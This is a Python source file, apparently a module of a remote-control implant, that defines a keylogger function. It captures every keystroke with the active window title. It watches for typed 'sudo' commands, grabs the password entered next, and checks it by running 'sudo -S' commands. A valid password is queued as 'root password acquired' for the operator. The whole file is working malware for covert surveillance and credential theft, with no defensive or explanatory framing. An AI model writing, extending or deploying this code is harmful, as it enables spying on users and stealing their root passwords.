def keylog(task_id):

    global responses
    global stopping_functions 


    def get_active_window_title():
        root = subprocess.Popen(['xprop', '-root', '_NET_ACTIVE_WINDOW'], stdout=subprocess.PIPE)
        stdout, stderr = root.communicate()

        m = re.search(b'^_NET_ACTIVE_WINDOW.* ([\w]+)$', stdout)
        if m != None:
            window_id = m.group(1)
            window = subprocess.Popen(['xprop', '-id', window_id, 'WM_NAME'], stdout=subprocess.PIPE)
            stdout, stderr = window.communicate()
        else:
            return "None"

        match = re.match(b"WM_NAME\(\w+\) = (?P<name>.+)$", stdout)
        if match != None:
            return match.group("name").strip(b'"').decode()

        return "None"


    def keylogger():

        def on_press(key):

            global line
            global nextIsPsw
            global sudo
            global break_function

            if "keylog" in stopping_functions:

                print(colored("\t - Keylogger stopped", "red"))

                response = {
                        "task_id": task_id,
                        "user": getpass.getuser(), 
                        "window_title": get_active_window_title(), 
                        "keystrokes": line,
                        "completed": True
                    }
                
                responses.append(response)
                line = ""
                break_function = False
                return False
            try:
                line = line + key.char
                k = key.char

            except:
                try:
                    k = key.name

                    if key.name == "backspace":
                        if len(line) > 0:
                            line = line[:-1]
                            
                    elif key.name == "space":
                        line += " "

                    elif key.name == "enter":

                        print(nextIsPsw)

                        if nextIsPsw == True:  
                            
                            print("I GOT THE PASSWORD: {}".format(line))

                            cmd = "echo {} | sudo -S touch fileToCheckSudo.asd".format(line)

                            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
                            stdout, stderr = p.communicate()

                            p = subprocess.Popen(["ls"], stdout=subprocess.PIPE)
                            stdout, stderr = p.communicate()   

                            if "fileToCheckSudo.asd" in str(stdout):
                                cmd = "echo {} | sudo -S rm fileToCheckSudo.asd".format(line)
                                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
                            
                                response = {
                                        "task_id": task_id,
                                        "user_output": "root password acquired: {}".format(line),
                                        "user": getpass.getuser(),
                                        "window_title": get_active_window_title(), 
                                        "keystrokes": line + "\n",
                                    }

                                responses.append(response)                           
                                nextIsPsw = False
                                sudo = line

                            line = ""

                        else:    
                            if 'sudo ' in line:
                                print("Next should be password")
                                nextIsPsw = True

                            response = {
                                    "task_id": task_id,
                                    "user": getpass.getuser(), 
                                    "window_title": get_active_window_title(), 
                                    "keystrokes": line + "\n",
                                }
                            responses.append(response)
                            line = ""


                    elif key.name == "shift" or key.name == "ctrl" or key.name == "alt" or key.name == "caps_lock" or key.name == "tab":
                        if "crtlc" in line:
                            line = ""
                            nextIsPsw = False
                    else:
                        line = line + key.name
                except:
                    pass
                
        
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.join()

    

    thread2 = threading.Thread(target=keylogger, args=())
    thread2.start()

    print("\t- Keylog Running")

line = ""
nextIsPsw = False